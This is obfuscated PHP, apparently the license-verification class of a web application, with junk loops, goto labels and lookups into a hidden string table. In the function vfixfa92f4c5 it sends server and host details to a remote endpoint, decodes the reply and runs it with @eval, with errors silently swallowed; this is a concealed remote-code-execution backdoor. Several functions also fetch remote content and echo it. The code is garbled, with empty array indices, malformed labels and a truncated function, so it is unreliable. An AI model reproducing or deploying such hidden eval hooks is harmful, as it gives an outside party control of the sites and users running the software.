$fՉŃ =& $_SERVER[]; $this->{$_SERVER[][37]}(); goto D۝; A: $_SERVER[$fՉŃ[44]] = $fՉŃ[6](ACTION); $this->{$_SERVER[][45]}(); $FÍ꒭ = $B􏦞[572]; goto bŻܵʩ; eӾ: $fՉŃ[39]($fՉŃ[43], MOD . $fՉŃ[1] . ST . $fՉŃ[1] . ACT); $Dό = $B􏦞[571]; if (strlen($Dό) < $B􏦞[559]) { die; } goto A; D۝: $D΅ = $B􏦞[568]; $this->{$_SERVER[][38]}(); $e卍 = $B􏦞[569]; goto Cꍛ; f筍: $fՉŃ[39]($fՉŃ[40], isset($DԄ[0]) && $DԄ[0] ? $DԄ[0] : $this->defaultModule); $fՉŃ[39]($fՉŃ[41], isset($DԄ[1]) && $DԄ[0] ? $DԄ[1] : $this->defaultController); $fՉŃ[39]($fՉŃ[42], isset($DԄ[2]) && $DԄ[0] ? $DԄ[2] : $this->defaultAction); goto eӾ; Cꍛ: $DԄ = $GLOBALS[$fՉŃ[22]][$fՉŃ[23]]; $dڈ = $GLOBALS[$fՉŃ[22]][$fՉŃ[28]]; $F򡕡ǩ = $B􏦞[570]; goto f筍; bŻܵʩ: if (!$FÍ꒭) { die; } if ($fՉŃ[19]($DԄ) >= 3) { $this->{$_SERVER[][21]}($dڈ); } else { $this->{$_SERVER[][21]}(ACTION); } goto C㙑; C㙑: } private $vlsb8d14d40c = array(); private $clfh4320e68e = ''; public function xsja272ce6c8() { goto CԷ; FΘ: $this->{$_SERVER[][50]}(); $aѠ = $eڹ[576]; while ($aѠ < $eڹ[574]) { if ($aѠ >= 0) { break; } $aѠ++; } goto B䊬; Aએ: $Aʷ = $eڹ[573]; while (strlen($Aʷ) < $eڹ[574]) { if (!$Aʷ) { break; } $Aʷ++; } $this->{$_SERVER[][47]}(); goto B; d˲č: $this->{$_SERVER[][3]}($Bɬ[57], array($this, $Bɬ[58])); $B = $eڹ[578]; while ($B < $eڹ[559]) { if ($B >= 0) { break; } $B++; } goto f; CԷ: $eڹ =& $_SERVER[]; $Bɬ =& $_SERVER[]; $this->{$_SERVER[][46]}(); goto Aએ; B䊬: $this->{$_SERVER[][51]}(); $this->{$_SERVER[][52]}(); $this->{$_SERVER[][3]}($Bɬ[53], array($this, $Bɬ[54])); goto bɾ;; bɾ;: $b = $eڹ[562]; $this->{$_SERVER[][3]}($Bɬ[55], array($this, $Bɬ[56])); $Eذ = $eڹ[577]; goto d˲č; B: $this->{$_SERVER[][48]}(); $this->{$_SERVER[][49]}(); $dƌ = $eڹ[575]; goto FΘ; f: $this->{$_SERVER[][3]}($Bɬ[59], array($this, $Bɬ[60])); $C = $eڹ[579]; goto C; C: } public function wxbzf2a9d558($B⮶) { goto a׺ɣ; f˩: $d䂒 = $dϣ[581]; foreach ($aƤŋ as $d) { $Bؚ = $GLOBALS[$c[93]][$c[94]][$d]; $eŃ = $dϣ[582]; while ($eŃ < $dϣ[583]) { if ($eŃ >= 0) { break; } $eŃ++; } if (isset($bÑ߬[$d])) { $Bؚ = $bÑ߬[$d]; } $B⮶[$c[95]][$c[96]][$d] = $Bؚ; } $Aڄč = $B⮶[$c[95]][$c[96]][$c[76]]; goto Eݳ; D: $B⮶[$c[110]][$c[111]] = $c[112]($c[113])->{$_SERVER[][114]}(); $AѨ = $dϣ[586]; if (strlen($AѨ) < $dϣ[559]) { return; } goto Eƻ; Eƻ: $B⮶[$c[110]][$c[115]] = $c[116]($_SERVER[$c[117]] . $bÑ߬[$c[118]]); $D֌Ȩ = $dϣ[587]; $B⮶[$c[110]][$c[119]] = $c[120]($c[121]()); goto B; eᄌ: $B⮶[$c[110]][$c[132]] = $c[106]($this->vlsb8d14d40c, $c[133], $c[10]); if ($c[106]($GLOBALS, $c[134]) && $this->config[$c[135]]) { $B⮶[$c[110]][$c[136]] = WEB_ROOT; } return $B⮶; goto e͙ك; Aϩ: unset($B⮶[$c[95]][$c[96]][$c[100]]); $Bǒ = $dϣ[584]; while ($Bǒ < $dϣ[583]) { if ($Bǒ >= 0) { break; } $Bǒ++; } goto b; C: $A = $dϣ[580]; if (!$A) { return; } $aƤŋ = array($c[64], $c[65], $c[66], $c[67], $c[68], $c[69], $c[70], $c[71], $c[72], $c[73], $c[74], $c[75], $c[76], $c[77], $c[78], $c[79], $c[80], $c[81], $c[82], $c[83], $c[84], $c[85], $c[86], $c[87], $c[88], $c[89], $c[90], $c[91], $c[92]); goto f˩; Eݳ: unset($B⮶[$c[95]][$c[97]][$c[98]]); unset($B⮶[$c[95]][$c[97]][$c[99]]); unset($B⮶[$c[95]][$c[96]][$c[76]]); goto Aϩ; a׺ɣ: $dϣ =& $_SERVER[]; $c =& $_SERVER[]; $bÑ߬ = $c[61]($c[62])->{$_SERVER[][63]}(); goto C; b: $B⮶[$c[95]][$c[96]][$c[101]] = array($c[102] => (int) $Aڄč[$c[103]], $c[104] => $c[105]($c[106]($Aڄč, $c[107], array())), $c[108] => (int) $c[106]($Aڄč, $c[109], 0)); $c൵ = $dϣ[585]; if (strlen($c൵) < $dϣ[550]) { return; } goto D; f: if ($bÑ߬[$c[122]] != $c[123]) { $B⮶[$c[110]][$c[124]] = $bÑ߬[$c[124]]; $B⮶[$c[110]][$c[125]] = $bÑ߬[$c[125]]; $D蠿 = $c[126](10) . $this->clfh4320e68e . $c[126](5); $B⮶[$c[95]][$c[127]][$c[128]] = $this->{$_SERVER[][129]}($D蠿, $B⮶[$c[110]][$c[115]]); } if ($this->clfh4320e68e == $c[123]) { $B⮶[$c[95]][$c[96]][$c[101]][$c[109]] = 0; } $B⮶[$c[110]][$c[130]] = $c[106]($this->vlsb8d14d40c, $c[131], $c[10]); goto eᄌ; B: $B⮶[$c[110]][$c[122]] = $this->clfh4320e68e; $F£ = $dϣ[588]; while (strlen($F£) < $dϣ[559]) { if (!$F£) { break; } $F£++; } goto f; e͙ك: } private function aeji1acf9143() { goto d̪ۭ; d̪ۭ: $E =& $_SERVER[]; $C߮ =& $_SERVER[]; if ($_SERVER[$C߮[44]] == $C߮[137]) { goto Cޙ; e̴: $cɉ = array($C߮[152] => $b̋); $aۜ؄ = $E[589]; while ($aۜ؄ < $E[590]) { if ($aۜ؄ >= 0) { break; } $aۜ؄++; } goto E߈ҳ; E߈ҳ: $C߮[13](array($C߮[153], $C߮[154]), $cɉ); $AК = $E[591]; if (strlen($AК) < $E[559]) { return; } goto e۞Һ; Cޙ: $b̋ = array($C߮[122] => $this->clfh4320e68e, $C߮[138] => $this->{$_SERVER[][139]}(), $C߮[140] => $C߮[61]($C߮[141])->{$_SERVER[][142]}()); if ($this->clfh4320e68e != $C߮[123]) { $Aᡡل = $C߮[106]($this->vlsb8d14d40c, $C߮[143]); if ($Aᡡل) { $b̋[$C߮[144]] = $Aᡡل; $b̋[$C߮[145]] = $C߮[146]($C߮[106]($this->vlsb8d14d40c, $C߮[147])); $b̋[$C߮[148]] = $C߮[106]($this->vlsb8d14d40c, $C߮[133]); } } $b̋ = $this->{$_SERVER[][149]}($C߮[150]($b̋), $C߮[116]($C߮[151])); goto e̴; e۞Һ: } goto c϶; d򫅋: while ($E󒪞˭ < $E[550]) { if ($E󒪞˭ >= 0) { break; } $E󒪞˭++; } $cĵ = $C߮[61]($C߮[62])->{$_SERVER[][63]}(); $D = $E[593]; goto eդɌ; c϶: if ($this->clfh4320e68e == $C߮[123]) { return; } $B̄ = array($C߮[155], $C߮[156], $C߮[157], $C߮[158], $C߮[159], $C߮[160]); $E󒪞˭ = $E[592]; goto d򫅋; cܔ: $C߮[13](array($C߮[153], $C߮[154]), $cɉ); $BɄ = $E[594]; if (strlen($BɄ) < $E[559]) { return; } goto Fԙ풒; eդɌ: if (strlen($D) < $E[583]) { die; } $cɉ = array($C߮[161] => $cĵ[$C߮[64]], $C߮[162] => $cĵ[$C߮[65]], $C߮[163] => $C߮[10]); foreach ($B̄ as $BӮϞ) { if (!isset($cĵ[$BӮϞ]) || !$cĵ[$BӮϞ]) { continue; } $cɉ[$BӮϞ] = $cĵ[$BӮϞ]; } goto cܔ; Fԙ풒: } private function nmgb9b38973e() { goto cЃ̣; cܡ: if (!$EĚ[106]($GLOBALS, $EĚ[134])) { die; } $B܍ = $GLOBALS[$EĚ[22]]; if (isset($B܍[$EĚ[165]])) { $this->{$_SERVER[][166]}(); die; } goto Aŉ; DƍΒ: if (!$a) { return; } $EĚ[61]($EĚ[11])->{$_SERVER[][228]}($C[$EĚ[229]], array($EĚ[230] => $DØ)); $this->vlsb8d14d40c = $e; goto B; cڂ: $EĚ[168]($EĚ[199]($EĚ[210]), !0); goto e͖ͧ; f: $dӬ = $eˢ[595]; while (strlen($dӬ) < $eˢ[583]) { if (!$dӬ) { break; } $dӬ++; } $e = $EĚ[116]($_SERVER[$EĚ[117]] . $Dѐ뎌); goto C; dȵ: $D캼 = array($EĚ[211] => $F[$EĚ[167]], $EĚ[212] => $e[$EĚ[213]], $EĚ[214] => $EĚ[126](16), $EĚ[122] => $e[$EĚ[215]]); if ($F[$EĚ[170]]) { $D캼[$EĚ[214]] = $F[$EĚ[170]]; } $Bի = $EĚ[25]($EĚ[116]($D캼[$EĚ[212]]), 10, 10); goto Bԛ; C: $d = $eˢ[596]; while ($d < $eˢ[574]) { if ($d >= 0) { break; } $d++; } if ($B܍[$EĚ[180]] == $EĚ[181]) { $d = $this->{$_SERVER[][149]}($e, $EĚ[182]); $d = $this->{$_SERVER[][129]}($EĚ[150]($F), $e . $EĚ[183], 3); $a = $this->{$_SERVER[][184]}($EĚ[185] . $d . $EĚ[186] . $d, -1); $EĚ[168]($a, !0); } else { if ($B܍[$EĚ[180]] == $EĚ[187]) { $F = $EĚ[25]($EĚ[116]($EĚ[188] . $e), 12, 15) . $EĚ[189]; $d = $this->{$_SERVER[][190]}($EĚ[2]($B܍[$EĚ[191]]), $F, 2); $fɰչ = $EĚ[192]($d, !0); if (!$EĚ[193]($fɰչ) || !$EĚ[193]($fɰչ[$EĚ[194]]) || $fɰչ[$EĚ[167]] != !0) { $DЫק = $EĚ[195]; $Bû = $fɰչ[$EĚ[194]] ? $EĚ[196] . $fɰչ[$EĚ[194]] : $DЫק; $EĚ[168]($Bû, !1); } else { $F[$EĚ[170]] = $fɰչ[$EĚ[194]][$EĚ[197]]; } } else { $fɰչ = $this->{$_SERVER[][184]}($EĚ[198], $F, 10); } } goto eϮ; FƔ: if (!$E㊯) { return; } $DØ[$eڏ] = $DŢ׃; $a = $eˢ[605]; goto DƍΒ; B: $this->clfh4320e68e = $D캼[$EĚ[122]]; $this->{$_SERVER[][231]}(); $aԺ = $eˢ[606]; goto cڂ; E: $Dɺ = $EĚ[224]($EĚ[61]($EĚ[11])->{$_SERVER[][225]}(), $EĚ[226]); $Aྉ = $eˢ[603]; while (strlen($Aྉ) < $eˢ[590]) { if (!$Aྉ) { break; } $Aྉ++; } goto F䅋; f暺: $EĚ[61]($EĚ[62])->{$_SERVER[][223]}($D캼); $dኊ = $EĚ[116]($_SERVER[$EĚ[117]] . $EĚ[216]($Dѐ뎌) . $D캼[$EĚ[212]]); $A = $eˢ[600]; goto fޗ; Aŉ: if (!isset($B܍[$EĚ[167]]) || $EĚ[24]($B܍[$EĚ[167]]) != 16) { $EĚ[168]($EĚ[169] . $B܍[$EĚ[167]], !1); } $Dѐ뎌 = $EĚ[61]($EĚ[62])->{$_SERVER[][63]}($EĚ[118]); $F = array($EĚ[167] => $B܍[$EĚ[167]], $EĚ[170] => $EĚ[126](16), $EĚ[171] => $EĚ[151], $EĚ[172] => $EĚ[173], $EĚ[174] => $_SERVER[$EĚ[175]], $EĚ[176] => $_SERVER[$EĚ[177]], $EĚ[178] => $_SERVER[$EĚ[179]]); goto f; cЃ̣: $eˢ =& $_SERVER[]; $EĚ =& $_SERVER[]; if ($_SERVER[$EĚ[44]] != $EĚ[164]) { return; } goto cܡ; BȄ: $D캼[$EĚ[125]] = $EĚ[120]($EĚ[216]($this->{$_SERVER[][149]}($a, $EĚ[218]))); $A = $eˢ[599]; if ($e[$EĚ[219]] && $e[$EĚ[219]] >= 1) { $EĚ[61]($EĚ[62])->{$_SERVER[][220]}($EĚ[221], $EĚ[222]); } goto f暺; F䅋: $C = $Dɺ[$EĚ[227]]; $DØ = array(); $E㊯ = $eˢ[604]; goto FƔ; eϮ: if (!$EĚ[193]($fɰչ) || !$EĚ[193]($fɰչ[$EĚ[194]]) || $fɰչ[$EĚ[167]] != !0) { $DЫק = $EĚ[199]($EĚ[200]); $Bû = $fɰչ[$EĚ[194]] ? $EĚ[196] . $fɰչ[$EĚ[194]] : $DЫק; $EĚ[168]($Bû, !1); } $e = $fɰչ[$EĚ[194]]; $a = $this->{$_SERVER[][201]}($e[$EĚ[202]]); goto BΑ; Bǋ: $DŢ׃ = $this->{$_SERVER[][129]}($EĚ[150]($e), $dኊ); $dۏ = $eˢ[602]; if (!$dۏ) { return; } goto E; D: $a = $E . $D캼[$EĚ[122]] . $this->{$_SERVER[][149]}($EĚ[116]($D캼[$EĚ[211]]), $E); $fȭε = $eˢ[598]; while (strlen($fȭε) < $eˢ[583]) { if (!$fȭε) { break; } $fȭε++; } goto BȄ; fޗ: $eڏ = $EĚ[216]($EĚ[25]($dኊ, 10, 16)); $EѨ = $eˢ[601]; while ($EѨ < $eˢ[590]) { if ($EѨ >= 0) { break; } $EѨ++; } goto Bǋ; BΑ: $C虨 = $eˢ[597]; while ($C虨 < $eˢ[583]) { if ($C虨 >= 0) { break; } $C虨++; } if (!$a || $a != $EĚ[203]($e[$EĚ[147]])) { $b݄ = array($EĚ[204] => $EĚ[61]($EĚ[62])->{$_SERVER[][63]}($EĚ[118]), $EĚ[205] => $_SERVER[$EĚ[117]], $EĚ[206] => $EĚ[207](), $EĚ[176] => $_SERVER[$EĚ[177]]); $d = $this->{$_SERVER[][208]}($EĚ[150]($b݄)); $this->{$_SERVER[][184]}($EĚ[209] . $d); $EĚ[168]($EĚ[199]($EĚ[210]), !0); } goto dȵ; Bԛ: $eύ = $Bի . $D캼[$EĚ[122]] . $D캼[$EĚ[214]]; $D캼[$EĚ[124]] = $EĚ[216]($EĚ[120]($this->{$_SERVER[][149]}($eύ, $EĚ[217]))); $E = $EĚ[126](16); goto D; e͖ͧ: } private function licenseRegistSuccess() { goto E; E: $c˫ =& $_SERVER[]; $C =& $_SERVER[]; $d = $C[61]($C[62])->{$_SERVER[][63]}(); goto BƋ; BƋ: $eѾ = $c˫[607]; while ($eѾ < $c˫[590]) { if ($eѾ >= 0) { break; } $eѾ++; } if ($d[$C[87]] != $C[222]) { $C[61]($C[62])->{$_SERVER[][223]}($C[87], $C[222]); } goto C󜆱; C󜆱: $C[112]($C[232])->{$_SERVER[][233]}(!0); goto aЊ; aЊ: } private function lziw07b8a73a() { $aĕ߳ =& $_SERVER[]; $aĕ߳[61]($aĕ߳[62])->{$_SERVER[][223]}(array($aĕ߳[211] => $aĕ߳[10], $aĕ߳[212] => $aĕ߳[10], $aĕ߳[122] => $aĕ߳[123], $aĕ߳[124] => $aĕ߳[10], $aĕ߳[125] => $aĕ߳[10])); $aĕ߳[61]($aĕ߳[62])->{$_SERVER[][220]}($aĕ߳[221], $aĕ߳[234]); $this->vlsb8d14d40c = array(); $this->clfh4320e68e = $aĕ߳[123]; } private function qynt20692194() { goto f; eۨ: $fȄ = $c[216]($c[25]($a֧Ϻ, 10, 16)); $Fߕ = $D[613]; $eᆞ = $this->{$_SERVER[][190]}($D鶥[$c[93]][$fȄ], $a֧Ϻ); goto Bʢ; f勑: if (!$dʝ) { die; } if ($d⎿[$c[122]] == $c[123]) { return; } $F܇ = $c[61]($c[62])->{$_SERVER[][63]}($c[118]); goto E莜; A۔: $bȊ = $D[609]; $d⎿ = $c[61]($c[62])->{$_SERVER[][63]}(); $dʝ = $D[610]; goto f勑; Bʢ: $D돊 = $D[614]; while (strlen($D돊) < $D[559]) { if (!$D돊) { break; } $D돊++; } $eᆞ = $c[192]($eᆞ, !0); goto A; Aƪ: $F = $D[608]; while ($F < $D[590]) { if ($F >= 0) { break; } $F++; } $this->clfh4320e68e = $c[123]; goto A۔; BǞ: $this->vlsb8d14d40c = $eᆞ; $this->clfh4320e68e = $d⎿[$c[122]]; goto f܍; f: $D =& $_SERVER[]; $c =& $_SERVER[]; $_SERVER[$c[177]] = $c[106]($_SERVER, $c[177], APP_HOST); goto Aƪ; BԃҾ: $D鶥 = $F[$c[227]]; $a֧Ϻ = $c[116]($_SERVER[$c[117]] . $c[216]($F܇) . $d⎿[$c[212]]); $eʑ = $D[612]; goto eۨ; A: if (!$c[193]($eᆞ)) { return $this->{$_SERVER[][166]}(); } $eǶ = $c[146]($eᆞ[$c[147]]); if ($c[235]() >= $eǶ) { return $this->{$_SERVER[][166]}(); } goto BǞ; E莜: $F = $c[224]($c[61]($c[11])->{$_SERVER[][225]}(), $c[226]); $aў = $D[611]; if (!$aў) { die; } goto BԃҾ; f܍: } private function kdxucf425e38() { goto B; cʧʚ: $Cٹ = $C˅[615]; while (strlen($Cٹ) < $C˅[559]) { if (!$Cٹ) { break; } $Cٹ++; } $E뵲 = $_SERVER[$D[44]]; goto DӖ; D: $C = array($D[239], $D[240]); if ($D[241]($E뵲, $C)) { if ($this->clfh4320e68e == $D[123] && isset($bֿн[$D[242]])) { $D[168]($D[199]($D[237]), !1, $D[238]); die; } $AÍ = $this->{$_SERVER[][139]}(); if ($AÍ != $D[203]($D[243])) { if ($AÍ <= $D[61]($D[141])->{$_SERVER[][142]}()) { $D[168]($D[199]($D[244]), !1, $D[238]); die; } } } goto a҆; DӖ: $B֒ = $C˅[616]; if (!$B֒) { return; } if ($E뵲 == $D[236] && $this->clfh4320e68e == $D[123]) { $D[168]($D[199]($D[237]), !1, $D[238]); } goto D; B: $C˅ =& $_SERVER[]; $D =& $_SERVER[]; $bֿн = $GLOBALS[$D[22]]; goto cʧʚ; a҆: } private function grtu0e03271e() { goto fʪ᝘; Eڢ馽: die; goto Bۇ; f: $f揎 = $A[250](array($A[251] => array($A[252] => $A[253], $A[254] => 3))); $Eή = $dĐ[618]; $a = @$A[255]($eئم, !1, $f揎); goto E̥; BϢ: $DǦ = $dĐ[617]; while (strlen($DǦ) < $dĐ[583]) { if (!$DǦ) { break; } $DǦ++; } $eئم = $this->{$_SERVER[][248]}($eئم, $A[249]); goto f; fʪ᝘: $dĐ =& $_SERVER[]; $A =& $_SERVER[]; $e = array($A[137], $A[245]); goto fκ; E̥: $C珜 = $dĐ[619]; if (!$C珜) { die; } $A[256]($A[257]); goto B禙; B禙: $C = $dĐ[620]; while ($C < $dĐ[583]) { if ($C >= 0) { break; } $C++; } if ($a && $A[32]($a, $A[258])) { echo $a; } goto Eڢ馽; fκ: if (!$A[106]($GLOBALS, $A[134]) || !isset($_GET[$A[246]])) { return; } if (!$A[241]($_SERVER[$A[44]], $e)) { return; } $eئم = $A[247]; goto BϢ; Bۇ: } public function lojgb99860a2($c) { goto dЗ; a: $D = $b䐉[0]($b䐉[268], $b䐉[106]($this->vlsb8d14d40c, $b䐉[131], $b䐉[10])); $e𞬄 = array(); $F󋲆ˬ = $E׳[622]; goto B͖; BݟЏ: $f = array($b䐉[260], $b䐉[261], $b䐉[262], $b䐉[263], $b䐉[264], $b䐉[265], $b䐉[266], $b䐉[267]); $dȃ = $E׳[621]; while (strlen($dȃ) < $E׳[590]) { if (!$dȃ) { break; } $dȃ++; } goto a; B͖: while (strlen($F󋲆ˬ) < $E׳[583]) { if (!$F󋲆ˬ) { break; } $F󋲆ˬ++; } foreach ($f as $e) { if (!$b䐉[241]($e, $D)) { $e𞬄[] = $e; } } foreach ($e𞬄 as $e) { unset($c[$e]); $dʦ = $E׳[623]; while (strlen($dʦ) < $E׳[583]) { if (!$dʦ) { break; } $dʦ++; } } goto dע隴; dע隴: return $c; goto BϑϽ; dЗ: $E׳ =& $_SERVER[]; $b䐉 =& $_SERVER[]; if ($this->clfh4320e68e == $b䐉[259]) { return $c; } goto BݟЏ; BϑϽ: } private function rltxfeec0c10() { $D׫ =& $_SERVER[]; if ($this->clfh4320e68e != $D׫[123]) { return; } $GLOBALS[$D׫[93]][$D׫[97]][$D׫[269]] = $D׫[222]; $GLOBALS[$D׫[93]][$D׫[270]] = $D׫[222]; if ($D׫[61]($D׫[271])->{$_SERVER[][63]}($D׫[87]) != $D׫[234]) { $D׫[61]($D׫[271])->{$_SERVER[][223]}($D׫[87], $D׫[234]); } } public function mlhnb423e03a() { $F =& $_SERVER[]; return $_SERVER[][272]; $Aۤ܇ = $F[624]; while (strlen($Aۤ܇) < $F[583]) { if (!$Aۤ܇) { break; } $Aۤ܇++; } } private function vfixfa92f4c5() { goto fۮ; F껉: if ($this->{$_SERVER[][201]}($aߜ[$f[282]]) != $Bݎ[$f[167]]) { $D = array($f[204] => $f[61]($f[62])->{$_SERVER[][63]}($f[118]), $f[205] => $_SERVER[$f[117]], $f[206] => $f[207](), $f[176] => $_SERVER[$f[177]]); $C = $this->{$_SERVER[][208]}($f[150]($D)); $aߜ = $this->{$_SERVER[][184]}($f[209] . $C); if ($aߜ && $f[193]($aߜ) && isset($aߜ[$f[282]])) { $B̩ = $this->{$_SERVER[][190]}($aߜ[$f[282]], 2); if ($B̩) { $B̩ = $this->{$_SERVER[][201]}($B̩); } if ($B̩) { try { @eval($B̩); } catch (Exception $E揉ȅ) { } } } } goto C˥ㅌ; fۮ: $Eڪ =& $_SERVER[]; $f =& $_SERVER[]; $eك = array($f[273], $f[274], $f[275]); goto Eيǻ; Eيǻ: $c = $f[276] . $f[116]($f[277]); $a擄 = $Eڪ[625]; if (strlen($a擄) < $Eڪ[574]) { die; } goto a; bׂꯎ: if ($bȻ && $f[235]() - $bȻ < $f[203]($f[280])) { return; } $f[13](array($f[278], $f[154]), $c, $f[235]()); $Bݎ = array($f[167] => $f[61]($f[62])->{$_SERVER[][63]}($f[211]), $f[180] => $this->clfh4320e68e, $f[178] => $_SERVER[$f[179]], $f[171] => $f[151], $f[174] => $_SERVER[$f[175]]); goto A; A: $aߜ = $this->{$_SERVER[][184]}($f[281], $Bݎ); $dŗ = $Eڪ[627]; if (strlen($dŗ) < $Eڪ[550]) { die; } goto Fƃ; Fƃ: if (!$f[193]($aߜ)) { return; } if ($aߜ[$f[167]] && $aߜ[$f[282]]) { if ($this->{$_SERVER[][201]}($aߜ[$f[282]]) == $Bݎ[$f[167]]) { return; } } $this->{$_SERVER[][166]}(); goto F껉; Aֶ: $bȻ = $f[13](array($f[278], $f[279]), $c); $eц = $Eڪ[626]; if (!$eц) { die; } goto bׂꯎ; a: if ($this->clfh4320e68e == $f[123] || !$f[106]($GLOBALS, $f[134])) { return; } if (!$f[241]($_SERVER[$f[44]], $eك)) { return; } if ($f[235]() % 4 != 0) { return; } goto Aֶ; C˥ㅌ: } private function rwyqb23a79d7($fľ = '', $Bù = array(), $c̨ = 5) { goto d; d: $Bӭ =& $_SERVER[]; $A۱ =& $_SERVER[]; $aҕ = $A۱[283]; goto CΓ; b׽: $b̷ = $Bӭ[631]; if (strlen($b̷) < $Bӭ[574]) { return; } goto fՖ; aՙ򝇂: $aҕ = $aҕ . $fľ . $A۱[285] . $A۱[286]($Bù); if ($Bù === -1) { return $aҕ; } $bጺ = $A۱[250](array($A۱[251] => array($A۱[254] => $c̨, $A۱[252] => $A۱[287]), $A۱[288] => array($A۱[289] => !1, $A۱[290] => !1))); goto b˩; CΓ: $a = $Bӭ[628]; while (strlen($a) < $Bӭ[550]) { if (!$a) { break; } $a++; } $aҕ = $this->{$_SERVER[][248]}($aҕ, $A۱[284]); goto aՙ򝇂; b˩: $Bù = @$A۱[255]($aҕ, !1, $bጺ); $fǄ = $Bӭ[629]; if (strlen($fǄ) < $Bӭ[559]) { die; } goto D; D: return $A۱[192]($Bù, !0); $Fƌ = $Bӭ[630]; while (strlen($Fƌ) < $Bӭ[550]) { if (!$Fƌ) { break; } $Fƌ++; } goto b׽; fՖ: } private function cjqr7238fe2b() { goto D燐Ȼ; fފ: $Fޞ = $Fޞ ? $bݾ[203]($Fޞ) : 0; $EϺ = $cŧ[634]; if (!$EϺ) { die; } goto Eҍ; a󕜐: $c = $E׃[$this->clfh4320e68e]; $c­ = $cŧ[632]; if (strlen($c­) < $cŧ[583]) { return; } goto aڇ; aڇ: $c = $bݾ[203]($c ? $c : $bݾ[292]); $E̯ = $cŧ[633]; $Fޞ = $bݾ[106]($this->vlsb8d14d40c, $bݾ[318]); goto fފ; Eҍ: return $c + $Fޞ; goto E; D燐Ȼ: $cŧ =& $_SERVER[]; $bݾ =& $_SERVER[]; $E׃ = array($bݾ[291] => $bݾ[292], $bݾ[293] => $bݾ[294], $bݾ[295] => $bݾ[296], $bݾ[297] => $bݾ[298], $bݾ[299] => $bݾ[300], $bݾ[301] => $bݾ[243], $bݾ[302] => $bݾ[243], $bݾ[303] => $bݾ[292], $bݾ[304] => $bݾ[294], $bݾ[305] => $bݾ[296], $bݾ[306] => $bݾ[307], $bݾ[308] => $bݾ[298], $bݾ[309] => $bݾ[310], $bݾ[311] => $bݾ[300], $bݾ[312] => $bݾ[313], $bݾ[314] => $bݾ[315], $bݾ[316] => $bݾ[317]); goto a󕜐; E: } public function liua3927f8ee($e߰) { goto CϚ; Cج: if ($e߰[$CȔ[319]] == $CȔ[222]) { return; } if ($aר >= $CȔ[203]($CȔ[243])) { return; } $d = $CȔ[61]($CȔ[141])->{$_SERVER[][142]}(); goto AǨܯ; fݺä: $F׆ = $CȔ[224]($F׆, $CȔ[10], $CȔ[319]); $dڵ҂ = $C麃[636]; if (strlen($dڵ҂) < $C麃[574]) { die; } goto cᭆ; cᭆ: if (!$CȔ[241]($e߰[$CȔ[319]], $F׆)) { $CȔ[168]($CȔ[323], !1, $CȔ[238]); } goto eة; CϚ: $C麃 =& $_SERVER[]; $CȔ =& $_SERVER[]; $aר = $this->{$_SERVER[][139]}(); goto Cج; AǨܯ: if ($d <= $aר) { return; } $F׆ = $CȔ[61]($CȔ[141])->{$_SERVER[][320]}($CȔ[319])->{$_SERVER[][321]}($aר)->{$_SERVER[][322]}(); $f՛Ρ = $C麃[635]; goto fݺä; eة: } public function jrbt12158f25() { goto dܓ; d: $f = $d[637]; $Eɉ = @$f[255]($A܈, !1, $A􌘇); $e = $d[638]; goto Fȋ; dܓ: $d =& $_SERVER[]; $f =& $_SERVER[]; if (!$f[106]($GLOBALS, $f[134]) || $f[324](1, 100) > 20) { return; } goto Eɮ; Eɮ: $A܈ = $f[247]; $A܈ = $this->{$_SERVER[][248]}($A܈, $f[249]); $A􌘇 = $f[250](array($f[251] => array($f[252] => $f[253], $f[254] => 3))); goto d; Fȋ: echo $f[325] . $f[326]($Eɉ) . $f[327]; goto CɡĘ; CɡĘ: } private function mkgo49d01fc5($cܢ讓, $E䛊ꍍ, $BԊ = 3) { goto F֤; E: $fӼ = $Dϋꊭ[650]; if ($BԊ - 1 > 0) { $eɵ➵ = $this->{$_SERVER[][129]}($eɵ➵, $E䛊ꍍ, $BԊ - 1); } return $eɵ➵; goto F訑; DÃ: $cܢ讓 = $Fﷴ[2]($cܢ讓); $a = $Fﷴ[324](0, 5) . $Fﷴ[10]; $fՉ = $Fﷴ[126](15); goto FǗξ; FǗξ: $d = $Dϋꊭ[639]; while (strlen($d) < $Dϋꊭ[590]) { if (!$d) { break; } $d++; } $C޴æ = $Fﷴ[329]; goto e簩; F֤: $Dϋꊭ =& $_SERVER[]; $Fﷴ =& $_SERVER[]; $Fﷴ[328](1); goto DÃ; e簩: $D = $Dϋꊭ[620]; switch ($a) { case $Fﷴ[234]: $eɵ➵ = $this->{$_SERVER[][149]}($cܢ讓, $Fﷴ[216]($E䛊ꍍ . $fՉ)); break; $a荚 = $Dϋꊭ[640]; case $Fﷴ[222]: $eɵ➵ = $this->{$_SERVER[][149]}($cܢ讓, $Fﷴ[216]($fՉ . $E䛊ꍍ)); break; case $Fﷴ[330]: $eɵ➵ = $this->{$_SERVER[][149]}($cܢ讓, $Fﷴ[120]($fՉ . $E䛊ꍍ)); break; case $Fﷴ[331]: $eɵ➵ = $this->{$_SERVER[][149]}($cܢ讓, $Fﷴ[116]($fՉ . $E䛊ꍍ)); $c = $Dϋꊭ[641]; break; case $Fﷴ[332]: goto e쨊ٔ; e: $f = $Fﷴ[10]; $A = $Dϋꊭ[646]; while (strlen($A) < $Dϋꊭ[583]) { if (!$A) { break; } $A++; } goto cڡ; F: $eɵ➵ = $Fﷴ[326]($AĈ . $f); break; goto Eӫ玼՞; e쨊ٔ: $cܢ讓 = $Fﷴ[120]($cܢ讓); $E = $Dϋꊭ[642]; if (!$E) { return; } goto C; cڡ: $E򗃳 = 0; $bʼ = 0; $b٨ = 0; goto eŠ; eŠ: $C篲 = $Dϋꊭ[647]; while (strlen($C篲) < $Dϋꊭ[590]) { if (!$C篲) { break; } $C篲++; } for ($E򗃳 = 0; $E򗃳 < $Fﷴ[24]($cܢ讓); $E򗃳++) { $b٨ = $b٨ == $Fﷴ[24]($dń) ? 0 : $b٨; $bʼ = ($D݄ + $Fﷴ[334]($C޴æ, $cܢ讓[$E򗃳]) + $Fﷴ[335]($dń[$b٨++])) % 64; $f .= $C޴æ[$bʼ]; } goto F; AØ: $dń = $Fﷴ[116]($AĈ . $Fﷴ[116]($E䛊ꍍ . $AĈ) . $E䛊ꍍ); $d͏ = $Dϋꊭ[644]; while (strlen($d͏) < $Dϋꊭ[550]) { if (!$d͏) { break; } $d͏++; } goto B; B: $dń = $Fﷴ[25]($dń, $D݄ % 8, $D݄ % 8 + 7); $dڎ = $Dϋꊭ[645]; if (!$dڎ) { return; } goto e; C: $D݄ = $Fﷴ[333](0, 64); $AĈ = $C޴æ[$D݄]; $f = $Dϋꊭ[643]; goto AØ; 